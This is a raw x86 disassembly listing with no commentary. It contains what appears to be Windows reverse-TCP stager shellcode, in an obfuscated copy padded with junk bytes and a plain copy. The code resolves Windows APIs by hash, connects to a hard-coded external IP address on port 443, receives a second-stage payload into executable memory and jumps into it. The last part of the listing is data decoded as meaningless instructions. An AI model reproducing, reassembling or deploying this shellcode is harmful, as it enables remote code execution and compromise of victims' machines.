  407ed5:	db 02                	fildl  (%edx)
  407ed7:	9d                   	popf
  407ed8:	01 d0                	add    %edx,%eax
  407eda:	eb 09                	jmp    0x407ee5
  407edc:	1e                   	push   %ds
  407edd:	24 cb                	and    $0xcb,%al
  407edf:	3a 67 9f             	cmp    -0x61(%edi),%ah
  407ee2:	0d b2 f9 50 8b       	or     $0x8b50f9b2,%eax
  407ee7:	48                   	dec    %eax
  407ee8:	18 90 8b 58 20 01    	sbb    %dl,0x120588b(%eax)
  407eee:	d3 eb                	shr    %cl,%ebx
  407ef0:	09 11                	or     %edx,(%ecx)
  407ef2:	6b 6e 48 e9          	imul   $0xffffffe9,0x48(%esi),%ebp
  407ef6:	03 27                	add    (%edi),%esp
  407ef8:	20 ac 85 c9 eb 0e 3e 	and    %ch,0x3e0eebc9(%ebp,%eax,4)
  407eff:	0b 9b f8 ea 1c 59    	or     0x591ceaf8(%ebx),%ebx
  407f05:	58                   	pop    %eax
  407f06:	18 30                	sbb    %dh,(%eax)
  407f08:	63 be e0 8e 0f 84    	arpl   %edi,-0x7bf07120(%esi)
  407f0e:	7c 01                	jl     0x407f11
  407f10:	00 00                	add    %al,(%eax)
  407f12:	90                   	nop
  407f13:	eb 09                	jmp    0x407f1e
  407f15:	5e                   	pop    %esi
  407f16:	18 c0                	sbb    %al,%al
  407f18:	b3 ea                	mov    $0xea,%bl
  407f1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f1b:	6e                   	outsb  %ds:(%esi),(%dx)
  407f1c:	6c                   	insb   (%dx),%es:(%edi)
  407f1d:	28 49 90             	sub    %cl,-0x70(%ecx)
  407f20:	eb 0f                	jmp    0x407f31
  407f22:	77 24                	ja     0x407f48
  407f24:	b9 06 16 e6 81       	mov    $0x81e61606,%ecx
  407f29:	c5 68 ff             	lds    -0x1(%eax),%ebp
  407f2c:	fc                   	cld
  407f2d:	ca e2 1d             	lret   $0x1de2
  407f30:	e7 31                	out    %eax,$0x31
  407f32:	ff 90 8b 34 8b 90    	call   *-0x6f74cb75(%eax)
  407f38:	01 d6                	add    %edx,%esi
  407f3a:	eb 08                	jmp    0x407f44
  407f3c:	f0 8b e4             	lock mov %esp,%esp
  407f3f:	1c b4                	sbb    $0xb4,%al
  407f41:	14 ab                	adc    $0xab,%al
  407f43:	2c 90                	sub    $0x90,%al
  407f45:	eb 0e                	jmp    0x407f55
  407f47:	31 76 19             	xor    %esi,0x19(%esi)
  407f4a:	2b 29                	sub    (%ecx),%ebp
  407f4c:	c0 6b 11 52          	shrb   $0x52,0x11(%ebx)
  407f50:	31 bd c5 a3 ea 31    	xor    %edi,0x31eaa3c5(%ebp)
  407f56:	c0 90 eb 0e b5 e4 e6 	rclb   $0xe6,-0x1b4af115(%eax)
  407f5d:	89 33                	mov    %esi,(%ebx)
  407f5f:	8b ed                	mov    %ebp,%ebp
  407f61:	17                   	pop    %ss
  407f62:	89 e1                	mov    %esp,%ecx
  407f64:	11 9d 35 01 c1 cf    	adc    %ebx,-0x303efecb(%ebp)
  407f6a:	0d 90 ac eb 0e       	or     $0xeebac90,%eax
  407f6f:	a9 35 2f 12 84       	test   $0x84122f35,%eax
  407f74:	5f                   	pop    %edi
  407f75:	73 e9                	jae    0x407f60
  407f77:	fb                   	sti
  407f78:	a2 8a 2a 5c 39       	mov    %al,0x395c2a8a
  407f7d:	01 c7                	add    %eax,%edi
  407f7f:	38 e0                	cmp    %ah,%al
  407f81:	eb 0d                	jmp    0x407f90
  407f83:	84 8b 44 c4 77 74    	test   %cl,0x7477c444(%ebx)
  407f89:	97                   	xchg   %eax,%edi
  407f8a:	b9 8d dd f6 13       	mov    $0x13f6dd8d,%ecx
  407f8f:	1a 0f                	sbb    (%edi),%cl
  407f91:	85 ae ff ff ff 90    	test   %ebp,-0x6f000001(%esi)
  407f97:	eb 0e                	jmp    0x407fa7
  407f99:	f0 72 fe             	lock jb 0x407f9a
  407f9c:	dc 8d 7f 67 71 8c    	fmull  -0x738e9881(%ebp)
  407fa2:	53                   	push   %ebx
  407fa3:	87 96 2b 68 90 eb    	xchg   %edx,-0x146f97d5(%esi)
  407fa9:	0c 5a                	or     $0x5a,%al
  407fab:	34 dd                	xor    $0xdd,%al
  407fad:	cc                   	int3
  407fae:	f3 c6                	repz (bad)
  407fb0:	ca d2 35             	lret   $0x35d2
  407fb3:	d6                   	salc
  407fb4:	da 74 03 7d          	fidivl 0x7d(%ebx,%eax,1)
  407fb8:	f8                   	clc
  407fb9:	90                   	nop
  407fba:	3b 7d 24             	cmp    0x24(%ebp),%edi
  407fbd:	0f 85 2c ff ff ff    	jne    0x407eef
  407fc3:	eb 09                	jmp    0x407fce
  407fc5:	7e 69                	jle    0x408030
  407fc7:	16                   	push   %ss
  407fc8:	55                   	push   %ebp
  407fc9:	56                   	push   %esi
  407fca:	93                   	xchg   %eax,%ebx
  407fcb:	fa                   	cli
  407fcc:	e0 08                	loopne 0x407fd6
  407fce:	90                   	nop
  407fcf:	58                   	pop    %eax
  407fd0:	90                   	nop
  407fd1:	8b 58 24             	mov    0x24(%eax),%ebx
  407fd4:	90                   	nop
  407fd5:	01 d3                	add    %edx,%ebx
  407fd7:	90                   	nop
  407fd8:	66 8b 0c 4b          	mov    (%ebx,%ecx,2),%cx
  407fdc:	8b 58 1c             	mov    0x1c(%eax),%ebx
  407fdf:	90                   	nop
  407fe0:	01 d3                	add    %edx,%ebx
  407fe2:	90                   	nop
  407fe3:	eb 09                	jmp    0x407fee
  407fe5:	a8 63                	test   $0x63,%al
  407fe7:	68 3f e5 a4 d3       	push   $0xd3a4e53f
  407fec:	77 28                	ja     0x408016
  407fee:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
  407ff1:	90                   	nop
  407ff2:	eb 09                	jmp    0x407ffd
  407ff4:	60                   	pusha
  407ff5:	c6                   	(bad)
  407ff6:	8d 26                	lea    (%esi),%esp
  407ff8:	c8 15 1b 99          	enter  $0x1b15,$0x99
  407ffc:	96                   	xchg   %eax,%esi
  407ffd:	01 d0                	add    %edx,%eax
  407fff:	90                   	nop
  408000:	89 44 24 24          	mov    %eax,0x24(%esp)
  408004:	90                   	nop
  408005:	eb 0e                	jmp    0x408015
  408007:	4b                   	dec    %ebx
  408008:	8f                   	(bad)
  408009:	90                   	nop
  40800a:	1b f0                	sbb    %eax,%esi
  40800c:	7c 8b                	jl     0x407f99
  40800e:	b1 e8                	mov    $0xe8,%cl
  408010:	aa                   	stos   %al,%es:(%edi)
  408011:	dd ce                	(bad)
  408013:	c7                   	(bad)
  408014:	9e                   	sahf
  408015:	5b                   	pop    %ebx
  408016:	90                   	nop
  408017:	eb 09                	jmp    0x408022
  408019:	86 48 62             	xchg   %cl,0x62(%eax)
  40801c:	49                   	dec    %ecx
  40801d:	33 7a 45             	xor    0x45(%edx),%edi
  408020:	86 da                	xchg   %bl,%dl
  408022:	5b                   	pop    %ebx
  408023:	eb 0a                	jmp    0x40802f
  408025:	b6 be                	mov    $0xbe,%dh
  408027:	67 0e                	addr16 push %cs
  408029:	7d 23                	jge    0x40804e
  40802b:	4c                   	dec    %esp
  40802c:	f8                   	clc
  40802d:	1c 1c                	sbb    $0x1c,%al
  40802f:	61                   	popa
  408030:	90                   	nop
  408031:	e9 0b 00 00 00       	jmp    0x408041
  408036:	2d 35 4e d1 3f       	sub    $0x3fd14e35,%eax
  40803b:	33 11                	xor    (%ecx),%edx
  40803d:	75 cd                	jne    0x40800c
  40803f:	fc                   	cld
  408040:	b6 59                	mov    $0x59,%dh
  408042:	90                   	nop
  408043:	e9 0e 00 00 00       	jmp    0x408056
  408048:	ad                   	lods   %ds:(%esi),%eax
  408049:	93                   	xchg   %eax,%ebx
  40804a:	a8 1b                	test   $0x1b,%al
  40804c:	cd b9                	int    $0xb9
  40804e:	22 fa                	and    %dl,%bh
  408050:	60                   	pusha
  408051:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408052:	e4 30                	in     $0x30,%al
  408054:	82 8b 5a e9 0b 00 00 	orb    $0x0,0xbe95a(%ebx)
  40805b:	00 94 2e ce 63 16 25 	add    %dl,0x251663ce(%esi,%ebp,1)
  408062:	7f 28                	jg     0x40808c
  408064:	29 97 5b 51 e9 0d    	sub    %edx,0xde9515b(%edi)
  40806a:	00 00                	add    %al,(%eax)
  40806c:	00 f8                	add    %bh,%al
  40806e:	9b                   	fwait
  40806f:	fe                   	(bad)
  408070:	31 b8 18 a8 fc a9    	xor    %edi,-0x560357e8(%eax)
  408076:	5e                   	pop    %esi
  408077:	b0 5a                	mov    $0x5a,%al
  408079:	e9 ff e0 90 e9       	jmp    0xe9d1617d
  40807e:	0c 00                	or     $0x0,%al
  408080:	00 00                	add    %al,(%eax)
  408082:	eb 0f                	jmp    0x408093
  408084:	42                   	inc    %edx
  408085:	fc                   	cld
  408086:	af                   	scas   %es:(%edi),%eax
  408087:	b6 4a                	mov    $0x4a,%dh
  408089:	59                   	pop    %ecx
  40808a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40808b:	68 c1 c6 90 58       	push   $0x5890c6c1
  408090:	e9 0a 00 00 00       	jmp    0x40809f
  408095:	85 65 33             	test   %esp,0x33(%ebp)
  408098:	84 3a                	test   %bh,(%edx)
  40809a:	eb 20                	jmp    0x4080bc
  40809c:	5b                   	pop    %ebx
  40809d:	7d 72                	jge    0x408111
  40809f:	5f                   	pop    %edi
  4080a0:	e9 0c 00 00 00       	jmp    0x4080b1
  4080a5:	b5 bf                	mov    $0xbf,%ch
  4080a7:	05 cc 21 0b 64       	add    $0x640b21cc,%eax
  4080ac:	48                   	dec    %eax
  4080ad:	ea 36 b8 cd 5a 90 8b 	ljmp   $0x8b90,$0x5acdb836
  4080b4:	12 e9                	adc    %cl,%ch
  4080b6:	8a fd                	mov    %ch,%bh
  4080b8:	ff                   	(bad)
  4080b9:	ff 90 90 5d 90 e9    	call   *-0x166fa270(%eax)
  4080bf:	0f 00 00             	sldt   (%eax)
  4080c2:	00 21                	add    %ah,(%ecx)
  4080c4:	27                   	daa
  4080c5:	4e                   	dec    %esi
  4080c6:	e7 6e                	out    %eax,$0x6e
  4080c8:	51                   	push   %ecx
  4080c9:	f3 c0 e4 5e          	repz shl $0x5e,%ah
  4080cd:	5f                   	pop    %edi
  4080ce:	78 5c                	js     0x40812c
  4080d0:	2b eb                	sub    %ebx,%ebp
  4080d2:	e9 0b 00 00 00       	jmp    0x4080e2
  4080d7:	66 00 29             	data16 add %ch,(%ecx)
  4080da:	75 d9                	jne    0x4080b5
  4080dc:	4b                   	dec    %ebx
  4080dd:	aa                   	stos   %al,%es:(%edi)
  4080de:	cd 29                	int    $0x29
  4080e0:	92                   	xchg   %eax,%edx
  4080e1:	95                   	xchg   %eax,%ebp
  4080e2:	be 62 01 00 00       	mov    $0x162,%esi
  4080e7:	6a 40                	push   $0x40
  4080e9:	e9 0a 00 00 00       	jmp    0x4080f8
  4080ee:	3a 30                	cmp    (%eax),%dh
  4080f0:	9c                   	pushf
  4080f1:	16                   	push   %ss
  4080f2:	4c                   	dec    %esp
  4080f3:	55                   	push   %ebp
  4080f4:	fb                   	sti
  4080f5:	4d                   	dec    %ebp
  4080f6:	60                   	pusha
  4080f7:	e8 68 00 10 00       	call   0x508164
  4080fc:	00 90 56 e9 0e 00    	add    %dl,0xee956(%eax)
  408102:	00 00                	add    %al,(%eax)
  408104:	55                   	push   %ebp
  408105:	69 bc 94 11 3c 59 bc 	imul   $0x76bba5b2,-0x43a6c3ef(%esp,%edx,4),%edi
  40810c:	b2 a5 bb 76 
  408110:	77 5a                	ja     0x40816c
  408112:	6a 00                	push   $0x0
  408114:	90                   	nop
  408115:	68 58 a4 53 e5       	push   $0xe553a458
  40811a:	ff d5                	call   *%ebp
  40811c:	90                   	nop
  40811d:	89 c3                	mov    %eax,%ebx
  40811f:	89 c7                	mov    %eax,%edi
  408121:	e9 0f 00 00 00       	jmp    0x408135
  408126:	e3 bc                	jecxz  0x4080e4
  408128:	a0 eb b6 ac f2       	mov    0xf2acb6eb,%al
  40812d:	97                   	xchg   %eax,%edi
  40812e:	19 59 1a             	sbb    %ebx,0x1a(%ecx)
  408131:	84 39                	test   %bh,(%ecx)
  408133:	19 90 89 f1 e8 28    	sbb    %edx,0x28e8f189(%eax)
  408139:	01 00                	add    %eax,(%eax)
  40813b:	00 e9                	add    %ch,%cl
  40813d:	0f 00 00             	sldt   (%eax)
  408140:	00 f6                	add    %dh,%dh
  408142:	1a d8                	sbb    %al,%bl
  408144:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408145:	1f                   	pop    %ds
  408146:	b8 f6 9c 20 b2       	mov    $0xb2209cf6,%eax
  40814b:	aa                   	stos   %al,%es:(%edi)
  40814c:	9b                   	fwait
  40814d:	e5 ff                	in     $0xff,%eax
  40814f:	44                   	inc    %esp
  408150:	e9 0a 00 00 00       	jmp    0x40815f
  408155:	18 21                	sbb    %ah,(%ecx)
  408157:	43                   	inc    %ebx
  408158:	de 78 af             	fidivrs -0x51(%eax)
  40815b:	ef                   	out    %eax,(%dx)
  40815c:	c2 e6 ac             	ret    $0xace6
  40815f:	5e                   	pop    %esi
  408160:	e9 08 00 00 00       	jmp    0x40816d
  408165:	af                   	scas   %es:(%edi),%eax
  408166:	0b 87 2e 9d 95 a3    	or     -0x5c6a62d2(%edi),%eax
  40816c:	6f                   	outsl  %ds:(%esi),(%dx)
  40816d:	f2 a4                	repnz movsb %ds:(%esi),%es:(%edi)
  40816f:	90                   	nop
  408170:	e9 0b 00 00 00       	jmp    0x408180
  408175:	75 aa                	jne    0x408121
  408177:	2d be 43 a0 63       	sub    $0x63a043be,%eax
  40817c:	df 82 b5 ea e8 bf    	filds  -0x4017154b(%edx)
  408182:	00 00                	add    %al,(%eax)
  408184:	00 e9                	add    %ch,%cl
  408186:	0f 00 00             	sldt   (%eax)
  408189:	00 cd                	add    %cl,%ch
  40818b:	79 84                	jns    0x408111
  40818d:	c0 ac 35 6e 7c 2b 61 	shrb   $0x18,0x612b7c6e(%ebp,%esi,1)
  408194:	18 
  408195:	15 9c 04 a1 90       	adc    $0x90a1049c,%eax
  40819a:	e9 0d 00 00 00       	jmp    0x4081ac
  40819f:	38 75 a7             	cmp    %dh,-0x59(%ebp)
  4081a2:	77 0d                	ja     0x4081b1
  4081a4:	f1                   	int1
  4081a5:	77 f2                	ja     0x408199
  4081a7:	ae                   	scas   %es:(%edi),%al
  4081a8:	78 c8                	js     0x408172
  4081aa:	02 21                	add    (%ecx),%ah
  4081ac:	bb e0 1d 2a 0a       	mov    $0xa2a1de0,%ebx
  4081b1:	e9 0d 00 00 00       	jmp    0x4081c3
  4081b6:	62 0c de             	bound  %ecx,(%esi,%ebx,8)
  4081b9:	14 5a                	adc    $0x5a,%al
  4081bb:	0e                   	push   %cs
  4081bc:	3d e4 91 cd 30       	cmp    $0x30cd91e4,%eax
  4081c1:	6d                   	insl   (%dx),%es:(%edi)
  4081c2:	5a                   	pop    %edx
  4081c3:	68 a6 95 bd 9d       	push   $0x9dbd95a6
  4081c8:	90                   	nop
  4081c9:	89 e8                	mov    %ebp,%eax
  4081cb:	90                   	nop
  4081cc:	e9 0c 00 00 00       	jmp    0x4081dd
  4081d1:	06                   	push   %es
  4081d2:	e8 ed 0e b0 c2       	call   0xc2f090c4
  4081d7:	5e                   	pop    %esi
  4081d8:	d4 46                	aam    $0x46
  4081da:	17                   	pop    %ss
  4081db:	7b 3c                	jnp    0x408219
  4081dd:	ff d0                	call   *%eax
  4081df:	3c 06                	cmp    $0x6,%al
  4081e1:	90                   	nop
  4081e2:	0f 8c 44 00 00 00    	jl     0x40822c
  4081e8:	e9 0a 00 00 00       	jmp    0x4081f7
  4081ed:	b8 11 c4 d0 6f       	mov    $0x6fd0c411,%eax
  4081f2:	b7 fb                	mov    $0xfb,%bh
  4081f4:	b8 57 da 80 fb       	mov    $0xfb80da57,%eax
  4081f9:	e0 e9                	loopne 0x4081e4
  4081fb:	0e                   	push   %cs
  4081fc:	00 00                	add    %al,(%eax)
  4081fe:	00 65 91             	add    %ah,-0x6f(%ebp)
  408201:	3d 6e 46 58 14       	cmp    $0x1458466e,%eax
  408206:	2d 51 ea b6 e9       	sub    $0xe9b6ea51,%eax
  40820b:	61                   	popa
  40820c:	e9 0f 85 19 00       	jmp    0x5a0720
  408211:	00 00                	add    %al,(%eax)
  408213:	90                   	nop
  408214:	bb 47 13 72 6f       	mov    $0x6f721347,%ebx
  408219:	e9 0e 00 00 00       	jmp    0x40822c
  40821e:	0b 82 87 37 e8 06    	or     0x6e83787(%edx),%eax
  408224:	a0 50 f5 a3 dc       	mov    0xdca3f550,%al
  408229:	d1 77 de             	shll   $1,-0x22(%edi)
  40822c:	90                   	nop
  40822d:	6a 00                	push   $0x0
  40822f:	53                   	push   %ebx
  408230:	90                   	nop
  408231:	e9 0c 00 00 00       	jmp    0x408242
  408236:	f1                   	int1
  408237:	39 15 86 7f 32 86    	cmp    %edx,0x86327f86
  40823d:	0c 77                	or     $0x77,%al
  40823f:	47                   	inc    %edi
  408240:	40                   	inc    %eax
  408241:	34 ff                	xor    $0xff,%al
  408243:	d5 31                	aad    $0x31
  408245:	c0 64 ff 30 64       	shlb   $0x64,0x30(%edi,%edi,8)
  40824a:	89 20                	mov    %esp,(%eax)
  40824c:	ff d3                	call   *%ebx
  40824e:	e9 0c 00 00 00       	jmp    0x40825f
  408253:	e7 97                	out    %eax,$0x97
  408255:	c7                   	(bad)
  408256:	5a                   	pop    %edx
  408257:	0c a5                	or     $0xa5,%al
  408259:	0f 08                	invd
  40825b:	af                   	scas   %es:(%edi),%eax
  40825c:	3b 3b                	cmp    (%ebx),%edi
  40825e:	15 e9 35 ff ff       	adc    $0xffff35e9,%eax
  408263:	ff                   	ljmp   (bad)
  408264:	e8 e7 fe ff ff       	call   0x408150
  408269:	fc                   	cld
  40826a:	e8 8f 00 00 00       	call   0x4082fe
  40826f:	60                   	pusha
  408270:	89 e5                	mov    %esp,%ebp
  408272:	31 d2                	xor    %edx,%edx
  408274:	64 8b 52 30          	mov    %fs:0x30(%edx),%edx
  408278:	8b 52 0c             	mov    0xc(%edx),%edx
  40827b:	8b 52 14             	mov    0x14(%edx),%edx
  40827e:	8b 72 28             	mov    0x28(%edx),%esi
  408281:	31 ff                	xor    %edi,%edi
  408283:	0f b7 4a 26          	movzwl 0x26(%edx),%ecx
  408287:	31 c0                	xor    %eax,%eax
  408289:	ac                   	lods   %ds:(%esi),%al
  40828a:	3c 61                	cmp    $0x61,%al
  40828c:	7c 02                	jl     0x408290
  40828e:	2c 20                	sub    $0x20,%al
  408290:	c1 cf 0d             	ror    $0xd,%edi
  408293:	01 c7                	add    %eax,%edi
  408295:	49                   	dec    %ecx
  408296:	75 ef                	jne    0x408287
  408298:	52                   	push   %edx
  408299:	8b 52 10             	mov    0x10(%edx),%edx
  40829c:	8b 42 3c             	mov    0x3c(%edx),%eax
  40829f:	57                   	push   %edi
  4082a0:	01 d0                	add    %edx,%eax
  4082a2:	8b 40 78             	mov    0x78(%eax),%eax
  4082a5:	85 c0                	test   %eax,%eax
  4082a7:	74 4c                	je     0x4082f5
  4082a9:	01 d0                	add    %edx,%eax
  4082ab:	50                   	push   %eax
  4082ac:	8b 48 18             	mov    0x18(%eax),%ecx
  4082af:	8b 58 20             	mov    0x20(%eax),%ebx
  4082b2:	01 d3                	add    %edx,%ebx
  4082b4:	85 c9                	test   %ecx,%ecx
  4082b6:	74 3c                	je     0x4082f4
  4082b8:	49                   	dec    %ecx
  4082b9:	31 ff                	xor    %edi,%edi
  4082bb:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
  4082be:	01 d6                	add    %edx,%esi
  4082c0:	31 c0                	xor    %eax,%eax
  4082c2:	ac                   	lods   %ds:(%esi),%al
  4082c3:	c1 cf 0d             	ror    $0xd,%edi
  4082c6:	01 c7                	add    %eax,%edi
  4082c8:	38 e0                	cmp    %ah,%al
  4082ca:	75 f4                	jne    0x4082c0
  4082cc:	03 7d f8             	add    -0x8(%ebp),%edi
  4082cf:	3b 7d 24             	cmp    0x24(%ebp),%edi
  4082d2:	75 e0                	jne    0x4082b4
  4082d4:	58                   	pop    %eax
  4082d5:	8b 58 24             	mov    0x24(%eax),%ebx
  4082d8:	01 d3                	add    %edx,%ebx
  4082da:	66 8b 0c 4b          	mov    (%ebx,%ecx,2),%cx
  4082de:	8b 58 1c             	mov    0x1c(%eax),%ebx
  4082e1:	01 d3                	add    %edx,%ebx
  4082e3:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
  4082e6:	01 d0                	add    %edx,%eax
  4082e8:	89 44 24 24          	mov    %eax,0x24(%esp)
  4082ec:	5b                   	pop    %ebx
  4082ed:	5b                   	pop    %ebx
  4082ee:	61                   	popa
  4082ef:	59                   	pop    %ecx
  4082f0:	5a                   	pop    %edx
  4082f1:	51                   	push   %ecx
  4082f2:	ff e0                	jmp    *%eax
  4082f4:	58                   	pop    %eax
  4082f5:	5f                   	pop    %edi
  4082f6:	5a                   	pop    %edx
  4082f7:	8b 12                	mov    (%edx),%edx
  4082f9:	e9 80 ff ff ff       	jmp    0x40827e
  4082fe:	5d                   	pop    %ebp
  4082ff:	68 33 32 00 00       	push   $0x3233
  408304:	68 77 73 32 5f       	push   $0x5f327377
  408309:	54                   	push   %esp
  40830a:	68 4c 77 26 07       	push   $0x726774c
  40830f:	89 e8                	mov    %ebp,%eax
  408311:	ff d0                	call   *%eax
  408313:	b8 90 01 00 00       	mov    $0x190,%eax
  408318:	29 c4                	sub    %eax,%esp
  40831a:	54                   	push   %esp
  40831b:	50                   	push   %eax
  40831c:	68 29 80 6b 00       	push   $0x6b8029
  408321:	ff d5                	call   *%ebp
  408323:	6a 0a                	push   $0xa
  408325:	68 b9 3e 3a cf       	push   $0xcf3a3eb9
  40832a:	68 02 00 01 bb       	push   $0xbb010002
  40832f:	89 e6                	mov    %esp,%esi
  408331:	50                   	push   %eax
  408332:	50                   	push   %eax
  408333:	50                   	push   %eax
  408334:	50                   	push   %eax
  408335:	40                   	inc    %eax
  408336:	50                   	push   %eax
  408337:	40                   	inc    %eax
  408338:	50                   	push   %eax
  408339:	68 ea 0f df e0       	push   $0xe0df0fea
  40833e:	ff d5                	call   *%ebp
  408340:	97                   	xchg   %eax,%edi
  408341:	6a 10                	push   $0x10
  408343:	56                   	push   %esi
  408344:	57                   	push   %edi
  408345:	68 99 a5 74 61       	push   $0x6174a599
  40834a:	ff d5                	call   *%ebp
  40834c:	85 c0                	test   %eax,%eax
  40834e:	74 0a                	je     0x40835a
  408350:	ff 4e 08             	decl   0x8(%esi)
  408353:	75 ec                	jne    0x408341
  408355:	e8 67 00 00 00       	call   0x4083c1
  40835a:	6a 00                	push   $0x0
  40835c:	6a 04                	push   $0x4
  40835e:	56                   	push   %esi
  40835f:	57                   	push   %edi
  408360:	68 02 d9 c8 5f       	push   $0x5fc8d902
  408365:	ff d5                	call   *%ebp
  408367:	83 f8 00             	cmp    $0x0,%eax
  40836a:	7e 36                	jle    0x4083a2
  40836c:	8b 36                	mov    (%esi),%esi
  40836e:	6a 40                	push   $0x40
  408370:	68 00 10 00 00       	push   $0x1000
  408375:	56                   	push   %esi
  408376:	6a 00                	push   $0x0
  408378:	68 58 a4 53 e5       	push   $0xe553a458
  40837d:	ff d5                	call   *%ebp
  40837f:	93                   	xchg   %eax,%ebx
  408380:	53                   	push   %ebx
  408381:	6a 00                	push   $0x0
  408383:	56                   	push   %esi
  408384:	53                   	push   %ebx
  408385:	57                   	push   %edi
  408386:	68 02 d9 c8 5f       	push   $0x5fc8d902
  40838b:	ff d5                	call   *%ebp
  40838d:	83 f8 00             	cmp    $0x0,%eax
  408390:	7d 28                	jge    0x4083ba
  408392:	58                   	pop    %eax
  408393:	68 00 40 00 00       	push   $0x4000
  408398:	6a 00                	push   $0x0
  40839a:	50                   	push   %eax
  40839b:	68 0b 2f 0f 30       	push   $0x300f2f0b
  4083a0:	ff d5                	call   *%ebp
  4083a2:	57                   	push   %edi
  4083a3:	68 75 6e 4d 61       	push   $0x614d6e75
  4083a8:	ff d5                	call   *%ebp
  4083aa:	5e                   	pop    %esi
  4083ab:	5e                   	pop    %esi
  4083ac:	ff 0c 24             	decl   (%esp)
  4083af:	0f 85 70 ff ff ff    	jne    0x408325
  4083b5:	e9 9b ff ff ff       	jmp    0x408355
  4083ba:	01 c3                	add    %eax,%ebx
  4083bc:	29 c6                	sub    %eax,%esi
  4083be:	75 c1                	jne    0x408381
  4083c0:	c3                   	ret
  4083c1:	bb f0 b5 a2 56       	mov    $0x56a2b5f0,%ebx
  4083c6:	6a 00                	push   $0x0
  4083c8:	53                   	push   %ebx
  4083c9:	ff d5                	call   *%ebp
  4083cb:	3a 01                	cmp    (%ecx),%al
  4083cd:	df 15 33 c0 52 3d    	fists  0x3d52c033
  4083d3:	01 00                	add    %eax,(%eax)
  4083d5:	00 8a 03 50 8c c0    	add    %cl,-0x3f73affd(%edx)
  4083db:	68 c1 40 00 63       	push   $0x630040c1
  4083e0:	c4 08                	les    (%eax),%ecx
  4083e2:	eb 15                	jmp    0x4083f9
  4083e4:	8b 15 de c1 bf 00    	mov    0xbfc1de,%edx
  4083ea:	ed                   	in     (%dx),%eax
  4083eb:	c9                   	leave
  4083ec:	52                   	push   %edx
  4083ed:	0b f7                	or     %edi,%esi
  4083ef:	02 66 8b             	add    -0x75(%esi),%ah
  4083f2:	4a                   	dec    %edx
  4083f3:	48                   	dec    %eax
  4083f4:	25 03 01 00 00       	and    $0x103,%eax
  4083f9:	85 c0                	test   %eax,%eax
  4083fb:	74 37                	je     0x408434
  4083fd:	8b fb                	mov    %ebx,%edi
  4083ff:	83 c9 fd             	or     $0xfffffffd,%ecx
  408402:	33 c0                	xor    %eax,%eax
  408404:	8b 1b                	mov    (%ebx),%ebx
  408406:	24 f2                	and    $0xf2,%al
  408408:	ae                   	scas   %es:(%edi),%al
  408409:	8b 45 20             	mov    0x20(%ebp),%eax
  40840c:	8b f3                	mov    %ebx,%esi
  40840e:	c7                   	(bad)
  40840f:	d1 55 8b             	rcll   $1,-0x75(%ebp)
  408412:	f8                   	clc
  408413:	89 50 41             	mov    %edx,0x41(%eax)
  408416:	8b 29                	mov    (%ecx),%ebp
  408418:	c1 e9 02             	shr    $0x2,%ecx
  40841b:	f3 b9 8b ca 83 8f    	repz mov $0x8f83ca8b,%ecx
  408421:	03 f3                	add    %ebx,%esi
  408423:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408424:	ae                   	scas   %es:(%edi),%al
  408425:	4d                   	dec    %ebp
  408426:	1c 5f                	sbb    $0x5f,%al
  408428:	fa                   	cli
  408429:	5b                   	pop    %ebx
  40842a:	c7                   	(bad)
  40842b:	d6                   	salc
  40842c:	00 00                	add    %al,(%eax)
  40842e:	00 00                	add    %al,(%eax)
  408430:	8b e5                	mov    %ebp,%esp
  408432:	5d                   	pop    %ebp
  408433:	c3                   	ret
  408434:	19 55 b9             	sbb    %edx,-0x47(%ebp)
  408437:	ce                   	into
  408438:	fa                   	cli
  408439:	66 75 6c             	data16 jne 0x4084a8
  40843c:	8b 45 18             	mov    0x18(%ebp),%eax
  40843f:	85 c0                	test   %eax,%eax
  408441:	7f 94                	jg     0x4083d7
  408443:	1a 75 f5             	sbb    -0xb(%ebp),%dh
  408446:	c6 06 30             	movb   $0x30,(%esi)
  408449:	46                   	inc    %esi
  40844a:	85 ff                	test   %edi,%edi
  40844c:	7e 51                	jle    0x40849f
  40844e:	c6 06 2e             	movb   $0x2e,(%esi)
  408451:	46                   	inc    %esi
  408452:	85 c0                	test   %eax,%eax
  408454:	7d 28                	jge    0x40847e
  408456:	f7 d8                	neg    %eax
  408458:	8b c8                	mov    %eax,%ecx
  40845a:	89 45 06             	mov    %eax,0x6(%ebp)
  40845d:	8b d1                	mov    %ecx,%edx
  40845f:	b8 d4 42 30 30       	mov    $0x303042d4,%eax
  408464:	4a                   	dec    %edx
  408465:	fe c1                	inc    %cl
  408467:	e9 5f 65 5d 8b       	jmp    0x8b9de9cb
  40846c:	ca 83 f1             	lret   $0xf183
  40846f:	03 f3                	add    %ebx,%esi
  408471:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408472:	8b 45 87             	mov    -0x79(%ebp),%eax
  408475:	99                   	cltd
  408476:	ca b3 50             	lret   $0x50b3
  408479:	08 03                	or     %al,(%ebx)
  40847b:	f1                   	int1
  40847c:	ec                   	in     (%dx),%al
  40847d:	0c 40                	or     $0x40,%al
  40847f:	3a 45 18             	cmp    0x18(%ebp),%al
  408482:	eb 1d                	jmp    0x4084a1
  408484:	48                   	dec    %eax
  408485:	46                   	inc    %esi
  408486:	11 45 18             	adc    %eax,0x18(%ebp)
  408489:	8a 0b                	mov    (%ebx),%cl
  40848b:	88 4e 22             	mov    %cl,0x22(%esi)
  40848e:	43                   	inc    %ebx
  40848f:	5b                   	pop    %ebx
  408490:	c0 7f f1 48          	sarb   $0x48,-0xf(%edi)
  408494:	85 ff                	test   %edi,%edi
  408496:	91                   	xchg   %eax,%ecx
  408497:	45                   	inc    %ebp
  408498:	dc 7f f1             	fdivrl -0xf(%edi)
  40849b:	8b 4d 2b             	mov    0x2b(%ebp),%ecx
  40849e:	15 c9 74 21 c6       	adc    $0xc62174c9,%eax
  4084a3:	06                   	push   %es
  4084a4:	2e 46                	cs inc %esi
  4084a6:	eb 1b                	jmp    0x4084c3
  4084a8:	8b 6f 20             	mov    0x20(%edi),%ebp
  4084ab:	8a 03                	mov    (%ebx),%al
  4084ad:	88 06                	mov    %al,(%esi)
  4084af:	46                   	inc    %esi
  4084b0:	43                   	inc    %ebx
  4084b1:	85 ff                	test   %edi,%edi
